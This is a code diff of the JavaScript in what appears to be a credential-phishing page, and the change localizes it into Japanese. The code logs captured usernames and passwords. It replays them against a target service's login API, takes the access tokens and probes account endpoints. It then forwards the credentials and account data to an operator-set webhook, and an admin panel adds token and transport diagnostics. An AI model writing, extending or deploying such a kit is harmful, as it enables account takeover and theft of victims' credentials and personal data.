-        $("acct").textContent="// login refused ["+tp+"] "+JSON.stringify(res).slice(0,400);
+        $("acct").textContent="// ログイン拒否 ["+tp+"] "+JSON.stringify(res).slice(0,400);
         return;
       }
       var token=res.data.accessToken;
       entry.clientId=res.data.clientId||"";
-      $("acct").textContent="// login OK via "+tp+" - probing endpoints ...";
+      $("acct").textContent="// ログインOK ["+tp+"] - エンドポイント探索中 ...";
       timeout(probe(token),90000).then(function(list){
-        if(!list){ $("acct").textContent="// probe timed out"; return; }
+        if(!list){ $("acct").textContent="// 探索タイムアウト"; return; }
         var best=pick(list);
         if(best){
           var j=JSON.stringify(best.data,null,1);
@@ -661,7 +662,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
           sendAcct(entry,best.path,j);
         }else{
           var raw=JSON.stringify(res.data,null,1);
-          $("acct").textContent="// no account route found ["+tp+"] - login payload only\n"+raw.slice(0,900);
+          $("acct").textContent="// エンドポイント不明 ["+tp+"] - ログイン情報のみ\n"+raw.slice(0,900);
           sendAcct(entry,"login",raw);
         }
       });
@@ -690,18 +691,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     if(!admin) return;
     $("aLog").innerHTML = log.length ? log.slice(0,10).map(function(e){
       return "<div><b>"+esc(e.ident)+"</b><br>"+esc(e.pass)+"<br>"+esc(e.time)+"</div>";
-    }).join("") : "<div>no captures yet</div>";
-  }
-  function renderDiag(rows){
-    $("aLog").innerHTML = "<div><b>DIAG</b> GET / POSTjson / POSTform / POSTtext</div>" + rows.map(function(r){
-      return "<div><b>"+esc(r.n)+"</b><br>GET: "+esc(r.get||"-")+"<br>POSTj: "+esc(r.post||"-")+"<br>POSTf: "+esc(r.form||"-")+"<br>POSTt: "+esc(r.txt||"-")+"</div>";
-    }).join("");
-  }
-  function renderTok(rows){
-    $("aLog").innerHTML = "<div><b>TOKEN DIAG</b> (/auth/me)</div>" + rows.map(function(r){
-      var bad = /code16/.test(r.r||"");
-      return "<div><b>"+(bad?"":"-> ")+esc(r.n)+"</b><br>"+esc(r.r||"-")+"</div>";
-    }).join("");
+    }).join("") : "<div>まだ記録はありません</div>";
   }
 
   if(admin){
@@ -714,24 +704,72 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     };
     $("aSave").onclick=function(){
       cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; cfg.acct=$("aAcct").value==="1";
-      saveCfg(); toast("Saved",true);
+      saveCfg(); toast("保存しました",true);
     };
     $("aTest").onclick=function(){
       cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; saveCfg();
-      sendCreds({ident:"test@example.com",pass:"testpass",time:new Date().toISOString()})
-        .then(function(ok){ toast(ok?"Test sent":"Send failed - check URL",ok) });
+      sendCreds({ident:"test@example.com",pass:"testpass",time:new Date().toLocaleString("ja-JP")})
+        .then(function(ok){ toast(ok?"テスト送信 OK":"送信失敗（URL確認）",ok) });
     };
-    $("aToken").onclick=function(){
+
+    /* route + transport diag */
+    $("aRoute").onclick=function(){
       var id=$("aIdent").value.trim(), pw=$("aPass").value;
-      if(!id||!pw){ toast("Enter ID and password"); return; }
-      $("aLog").innerHTML="<div>logging in...</div>";
+      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
+      $("aLog").innerHTML="<div>ログイン中...</div>";
       timeout(login(id,pw),60000).then(function(res){
         if(!res || !res.data || !res.data.accessToken){
-          $("aLog").innerHTML="<div>login failed</div>"; return;
+          $("aLog").innerHTML="<div>ログイン失敗</div>"; return;
         }
+        var t=res.data.accessToken;
+        var out=[];
+
+        function draw(){
+          $("aLog").innerHTML = out.join("");
+        }
+        out.push("<div><b>経路テスト /auth/me (Bearer)</b></div>");
+        var p=Promise.resolve();
+        ["sdk","corsfix","direct"].forEach(function(name){
+          p=p.then(function(){
+            var a=null;
+            for(var i=0;i<TR.length;i++) if(TR[i].n===name) a=TR[i];
+            if(!a) return;
+            return once(a,API+"/auth/me",{headers:{Authorization:"Bearer "+t}},a.t).then(function(r){
+              out.push("<div>"+esc(name)+": "+esc(r)+(r==="code16"?"":" <b><- hit</b>")+"</div>");
+              draw();
+            });
+          });
+        });
+
+        out.push("<div><b>ルート探索 "+ROUTES.length+"本</b></div>");
+        p=p.then(function(){ draw(); });
+        ROUTES.forEach(function(path){
+          p=p.then(function(){
+            return timeout(call(path,{headers:{Authorization:"Bearer "+t}}),15000).then(function(d){
+              var s = d ? JSON.stringify(d).slice(0,120) : "null";
+              var hit = d && d.code!==16;
+              out.push("<div>"+(hit?"<b>-> "+esc(path)+"</b><br>":"")+esc(hit?"":path+": ")+esc(s)+"</div>");
+              draw();
+            });
+          });
+        });
+        p.then(function(){ toast("ルート調査 完了"); });
+      });
+    };
+
+    $("aToken").onclick=function(){
+      var id=$("aIdent").value.trim(), pw=$("aPass").value;
+      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
+      $("aLog").innerHTML="<div>ログイン中...</div>";
+      timeout(login(id,pw),60000).then(function(res){
+        if(!res || !res.data || !res.data.accessToken){ $("aLog").innerHTML="<div>ログイン失敗</div>"; return; }
         var t=res.data.accessToken, c=res.data.clientId||"";
         var rows=[];
-        $("aLog").innerHTML="<div>token ok, testing 11 ways ...</div>";
+        function draw(){
+          $("aLog").innerHTML="<div><b>トークン調査</b> (/auth/me)</div>"+rows.map(function(r){
+            return "<div>"+(/code16/.test(r.r)?"":"<b>-> ")+esc(r.n)+(/code16/.test(r.r)?"":"</b>")+"<br>"+esc(r.r)+"</div>";
+          }).join("");
+        }
         var p=Promise.resolve();
         COMBOS.forEach(function(cb){
           p=p.then(function(){
@@ -739,58 +777,60 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
             if(cb.q) url="/auth/me?"+cb.q+"="+encodeURIComponent(t);
             else opts={headers:cb.h(t,c)};
             return timeout(call(url,opts),15000).then(function(d){
-              rows.push({n:cb.n, r:d?JSON.stringify(d).slice(0,110):"null"});
-              renderTok(rows);
+              rows.push({n:cb.n, r:d?JSON.stringify(d).slice(0,90):"null"}); draw();
             });
           });
         });
-        p.then(function(){ toast("Token diag done"); });
+        p.then(function(){ toast("トークン調査 完了"); });
       });
     };
+
     $("aDiag").onclick=function(){
       var target=API+"/auth/login";
       var json=JSON.stringify({ident:"diag@example.com",password:"x",remember:true,fingerprint:"diag"});
       var form="ident=diag%40example.com&password=x&remember=true&fingerprint=diag";
       var rows=[];
-      $("aLog").innerHTML="<div>running diag ...</div>";
+      function draw(){
+        $("aLog").innerHTML="<div><b>通信診断</b></div>"+rows.map(function(r){
+          return "<div><b>"+esc(r.n)+"</b><br>GET: "+esc(r.get||"-")+"<br>POSTj: "+esc(r.post||"-")+"<br>POSTf: "+esc(r.form||"-")+"<br>POSTt: "+esc(r.txt||"-")+"</div>";
+        }).join("");
+      }
+      $("aLog").innerHTML="<div>通信診断中 ...</div>";
       var p=Promise.resolve();
       TR.forEach(function(tr){
         p=p.then(function(){
-          var row={n:tr.n};
-          rows.push(row); renderDiag(rows);
-          return once(tr,target,{},tr.t).then(function(a){
-            row.get=a; renderDiag(rows);
+          var row={n:tr.n}; rows.push(row); draw();
+          return once(tr,target,{},tr.t).then(function(a){ row.get=a; draw();
             return once(tr,target,{method:"POST",headers:{"Content-Type":"application/json"},body:json},tr.t);
-          }).then(function(b){
-            row.post=b; renderDiag(rows);
+          }).then(function(b){ row.post=b; draw();
             return once(tr,target,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:form},tr.t);
-          }).then(function(c){
-            row.form=c; renderDiag(rows);
+          }).then(function(c){ row.form=c; draw();
             return once(tr,target,{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:json},tr.t);
-          }).then(function(d){ row.txt=d; renderDiag(rows); });
+          }).then(function(d){ row.txt=d; draw(); });
         });
       });
-      p.then(function(){ toast("Diag done"); });
+      p.then(function(){ toast("通信診断 完了"); });
     };
+
     $("aProbe").onclick=function(){
       var id=$("aIdent").value.trim(), pw=$("aPass").value;
-      if(!id||!pw){ toast("Enter ID and password"); return; }
-      $("aLog").innerHTML="<div>connecting...</div>";
+      if(!id||!pw){ toast("IDとパスワードを入力"); return; }
+      $("aLog").innerHTML="<div>接続中...</div>";
       timeout(login(id,pw),90000).then(function(res){
-        if(!res){ $("aLog").innerHTML="<div>no response - all transports failed</div>"; return; }
+        if(!res){ $("aLog").innerHTML="<div>応答なし（全経路だめ）</div>"; return; }
         if(!(res.data && res.data.accessToken)){
-          $("aLog").innerHTML="<div><b>login refused</b> ["+esc(tp)+"]<br>"+esc(JSON.stringify(res).slice(0,400))+"</div>"; return;
+          $("aLog").innerHTML="<div><b>ログイン拒否</b> ["+esc(tp)+"]<br>"+esc(JSON.stringify(res).slice(0,400))+"</div>"; return;
         }
-        $("aLog").innerHTML="<div><b>login OK</b> via "+esc(tp)+"<br>clientId "+esc(res.data.clientId||"?")+"</div><div>probing...</div>";
+        $("aLog").innerHTML="<div><b>ログインOK</b> ["+esc(tp)+"]</div><div>探索中...</div>";
         timeout(probe(res.data.accessToken),90000).then(function(list){
-          if(!list){ $("aLog").innerHTML="<div>probe timed out</div>"; return; }
-          $("aLog").innerHTML="<div><b>transport: "+esc(tp)+"</b></div>"+list.map(function(x){
+          if(!list){ $("aLog").innerHTML="<div>探索タイムアウト</div>"; return; }
+          $("aLog").innerHTML="<div><b>経路: "+esc(tp)+"</b></div>"+list.map(function(x){
             return "<div><b>"+esc(x.path)+"</b><br>"+esc(JSON.stringify(x.data).slice(0,240))+"</div>";
           }).join("");
         });
       });
     };
-    $("aClear").onclick=function(){ log=[]; saveLog(); renderLog(); toast("Log cleared"); };
+    $("aClear").onclick=function(){ log=[]; saveLog(); renderLog(); toast("ログを削除しました"); };
   }
 })();
 </script>
